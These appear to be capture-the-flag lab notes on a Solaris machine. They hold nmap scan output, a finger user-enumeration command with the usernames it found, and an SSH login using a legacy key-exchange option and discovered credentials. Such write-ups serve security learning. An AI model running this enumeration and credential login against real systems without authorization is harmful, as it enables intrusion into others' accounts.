#  Nmap
* OS: Solaris

Scan of all ports
```bash
PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open  rpcbind 2-4 (RPC #100000)
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
54186/tcp open  unknown
54535/tcp open  rpcbind
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

```



# Finger user enum 
[Finger User Enumerator](https://github.com/pentestmonkey/finger-user-enum)
```bash
./finger-user-enum.pl -U /opt/SecLists/Usernames/Names/names.txt -t 10.10.10.76 | less -S

```

```bash

######## Scan started at Mon Nov  8 00:57:45 2021 #########
access@10.10.10.76: access No Access User 
admin@10.10.10.76: Login       Name                           
anne marie@10.10.10.76: Login       Name              
bin@10.10.10.76: bin             ???                    
dee dee@10.10.10.76: Login       Name               
jo ann@10.10.10.76: Login       Name              
la verne@10.10.10.76: Login       Name        
line@10.10.10.76: Login       Name         
message@10.10.10.76: Login       Name            
miof mela@10.10.10.76: Login       Name        
root@10.10.10.76: root     Super-User     
sunny@10.10.10.76: sunny  
sys@10.10.10.76: sys 
zsa zsa@10.10.10.76: Login
```

This solaris machine has a old protocol ssh
```bash
ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
```
creds: sunny:sunday
